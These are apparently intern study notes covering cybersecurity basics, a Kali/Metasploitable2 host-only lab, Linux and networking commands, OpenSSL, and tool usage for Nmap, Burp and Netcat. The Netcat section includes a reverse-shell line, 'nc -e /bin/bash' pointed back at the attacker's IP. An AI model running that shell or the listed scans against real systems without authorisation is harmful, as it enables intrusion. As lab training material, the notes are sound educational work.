# Task 1: Foundation & Environment Setup
> ApexPlanet Cybersecurity Internship | Days 1–12

---

## 1. Cybersecurity Basics

### CIA Triad
| Pillar | Definition | Example Attack |
|--------|-----------|----------------|
| **Confidentiality** | Only authorized users can access data | Data breach, eavesdropping |
| **Integrity** | Data is accurate and untampered | Man-in-the-middle, file tampering |
| **Availability** | Systems are accessible when needed | DDoS, ransomware |

### Threat Types
| Threat | Description |
|--------|-------------|
| **Phishing** | Fake emails/sites to steal credentials |
| **Malware** | Malicious software (virus, worm, trojan) |
| **DDoS** | Flooding a server to make it unavailable |
| **SQL Injection** | Injecting SQL code into input fields |
| **Brute Force** | Systematically trying all password combinations |
| **Ransomware** | Encrypts victim's files and demands payment |

### Attack Vectors
- **Social Engineering** — Manipulating humans to reveal information (pretexting, baiting, tailgating)
- **Wireless Attacks** — Evil twin AP, WPA2 cracking, deauth attacks
- **Insider Threats** — Malicious or negligent employees with internal access

---

## 2. Lab Environment Setup

### Architecture
```
[Kali Linux - Attacker]
        |
   Host-Only Network (192.168.56.x)
        |
[Metasploitable2 / DVWA - Target]
```

### Setup Steps
1. Install **VirtualBox** → https://virtualbox.org
2. Create VM for **Kali Linux** (2 CPU, 4GB RAM, 50GB disk)
3. Create VM for **Metasploitable2** (1 CPU, 512MB RAM)
4. Set both VMs to **Host-Only Adapter** (vboxnet0)
5. Boot both, verify connectivity: `ping <target-ip>`

### Verify Lab
```bash
# On Kali - find your IP
ip a show eth0

# Ping Metasploitable2
ping 192.168.56.101

# Quick port scan to confirm target is up
nmap -sn 192.168.56.0/24
```

---

## 3. Linux Fundamentals

### File System Navigation
```bash
pwd                  # Print current directory
ls -la               # List all files with permissions
cd /path/to/dir      # Change directory
cd ..                # Go up one level
cd ~                 # Go to home directory
find / -name "*.txt" # Find files by name
locate filename      # Fast file search (uses index)
```

### File & Directory Permissions
```bash
# Permission format: rwxrwxrwx (owner/group/others)
chmod 755 file.sh    # rwxr-xr-x
chmod 644 file.txt   # rw-r--r--
chmod +x script.sh   # Add execute permission
chown user:group file # Change owner and group

# SUID/SGID/Sticky Bit
chmod u+s file       # SUID - runs as file owner
chmod g+s dir        # SGID - new files inherit group
chmod +t /tmp        # Sticky bit - only owner can delete
```

### Package Management
```bash
apt update           # Update package list
apt upgrade          # Upgrade all packages
apt install nmap     # Install a package
apt remove nmap      # Remove a package
apt search tool      # Search for a package
dpkg -l              # List installed packages
dpkg -i package.deb  # Install .deb file manually
```

### Networking Commands
```bash
ifconfig             # Show network interfaces (legacy)
ip a                 # Show IP addresses (modern)
ip r                 # Show routing table
ping -c 4 8.8.8.8   # Ping Google DNS 4 times
netstat -tulpn       # Show open ports and services
ss -tulpn            # Modern alternative to netstat
traceroute google.com # Trace network path
nslookup google.com  # DNS lookup
dig google.com       # Detailed DNS lookup
whois google.com     # Domain registration info
```

---

## 4. Networking Basics

### OSI Model
| Layer | Name | Protocols | Example |
|-------|------|-----------|---------|
| 7 | Application | HTTP, FTP, DNS, SMTP | Web browser |
| 6 | Presentation | SSL/TLS, JPEG | Encryption |
| 5 | Session | NetBIOS, RPC | Session management |
| 4 | Transport | TCP, UDP | Port numbers |
| 3 | Network | IP, ICMP, ARP | IP addresses |
| 2 | Data Link | Ethernet, MAC | MAC addresses |
| 1 | Physical | Cables, Wi-Fi | Hardware |

**Memory Aid:** *All People Seem To Need Data Processing*

### TCP vs UDP
| Feature | TCP | UDP |
|---------|-----|-----|
| Connection | Connection-oriented | Connectionless |
| Reliability | Guaranteed delivery | No guarantee |
| Speed | Slower | Faster |
| Use Case | HTTP, SSH, FTP | DNS, VoIP, streaming |

### TCP 3-Way Handshake
```
Client ──SYN──────────────► Server
Client ◄──SYN-ACK────────── Server
Client ──ACK──────────────► Server
       [Connection Established]
```

### IP Addressing & Subnetting
```
Class A: 10.0.0.0/8       → 16M hosts
Class B: 172.16.0.0/12    → 1M hosts
Class C: 192.168.0.0/16   → 65K hosts

Common Subnets:
/24 = 255.255.255.0  → 254 hosts
/25 = 255.255.255.128 → 126 hosts
/30 = 255.255.255.252 → 2 hosts (point-to-point)
```

### Key Ports to Know
| Port | Protocol | Service |
|------|----------|---------|
| 21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP |
| 443 | TCP | HTTPS |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP |
| 8080 | TCP | HTTP Alt |

---

## 5. Cryptography Basics

### Symmetric vs Asymmetric
| Type | Keys | Speed | Use Case |
|------|------|-------|----------|
| **Symmetric** | Same key to encrypt/decrypt | Fast | AES, file encryption |
| **Asymmetric** | Public key encrypts, Private key decrypts | Slow | RSA, SSL/TLS handshake |

### Hashing
```bash
# Hashing - one-way, cannot be reversed
echo -n "password" | md5sum       # MD5 (insecure, avoid)
echo -n "password" | sha256sum    # SHA-256 (secure)
echo -n "password" | sha512sum    # SHA-512 (most secure)

# Verify file integrity
md5sum file.iso
sha256sum file.iso
```

### OpenSSL Hands-On
```bash
# Generate RSA key pair
openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.key

# Encrypt a file (symmetric AES)
openssl enc -aes-256-cbc -salt -in plain.txt -out encrypted.bin
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt

# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Check certificate details
openssl x509 -in cert.pem -text -noout

# Hash a string
echo -n "hello" | openssl dgst -sha256
```

### SSL/TLS Concepts
- **SSL/TLS** — Encrypts data in transit between client and server
- **Digital Certificate** — Proves identity of a server, issued by CA
- **CA (Certificate Authority)** — Trusted entity that signs certificates (DigiCert, Let's Encrypt)
- **PKI** — Infrastructure that manages keys and certificates

---

## 6. Tool Familiarization

### Wireshark
```
Key Filters:
  http                    → Show only HTTP traffic
  tcp.port == 80          → Traffic on port 80
  ip.addr == 192.168.1.1  → Traffic to/from IP
  dns                     → DNS queries only
  ftp                     → FTP traffic
  tcp.flags.syn == 1      → SYN packets only

Tips:
  - Follow TCP Stream → Right-click packet → Follow → TCP Stream
  - Export objects → File → Export Objects → HTTP
  - Statistics → Protocol Hierarchy (traffic breakdown)
```

### Nmap
```bash
# Basic Scans
nmap 192.168.56.101              # Default scan (top 1000 ports)
nmap -sV 192.168.56.101          # Service version detection
nmap -O 192.168.56.101           # OS detection
nmap -sS 192.168.56.101          # SYN stealth scan
nmap -sU 192.168.56.101          # UDP scan
nmap -p- 192.168.56.101          # All 65535 ports
nmap -p 22,80,443 192.168.56.101 # Specific ports
nmap -A 192.168.56.101           # Aggressive (OS+version+scripts)
nmap -sC 192.168.56.101          # Default NSE scripts
nmap --script vuln 192.168.56.101 # Vulnerability scripts

# Output Formats
nmap -oN output.txt 192.168.56.101   # Normal output
nmap -oX output.xml 192.168.56.101   # XML output
nmap -oG output.gnmap 192.168.56.101 # Grepable output
nmap -oA output 192.168.56.101       # All formats

# Scan a network range
nmap -sn 192.168.56.0/24         # Ping sweep (host discovery)
```

### Burp Suite
```
Setup:
  1. Open Burp Suite → Proxy → Options → 127.0.0.1:8080
  2. Set browser proxy → 127.0.0.1:8080
  3. Install Burp CA cert in browser

Key Modules:
  Proxy    → Intercept and modify HTTP requests
  Repeater → Manually resend and tweak requests
  Intruder → Automated fuzzing and brute force
  Scanner  → Automated vulnerability scanning (Pro only)
  Decoder  → Encode/decode Base64, URL, HTML

Quick Intercept:
  - Toggle Intercept On/Off with button
  - Forward: sends request as-is
  - Drop: discards the request
```

### Netcat
```bash
# Listen for connections
nc -lvp 4444

# Connect to a host
nc 192.168.56.101 80

# Banner grabbing
nc 192.168.56.101 22

# File transfer
# Receiver:
nc -lvp 4444 > received_file
# Sender:
nc 192.168.56.101 4444 < file_to_send

# Simple reverse shell (from target)
nc -e /bin/bash 192.168.56.100 4444
# Listener (on attacker):
nc -lvp 4444
```

---

## Key Concepts Summary

| Concept | One-liner |
|---------|-----------|
| CIA Triad | Confidentiality, Integrity, Availability |
| Threat vs Vulnerability | Threat exploits a Vulnerability |
| Risk | Likelihood × Impact |
| Zero-Day | Vulnerability with no patch yet |
| CVE | Common Vulnerabilities and Exposures (public ID) |
| CVSS | Score 0–10 rating vulnerability severity |
| Pentest vs Hacking | Authorized vs Unauthorized |
| Black/Grey/White Box | No info / Some info / Full info testing |

---

*Notes by Manivel R | ApexPlanet Cybersecurity Internship 2026*
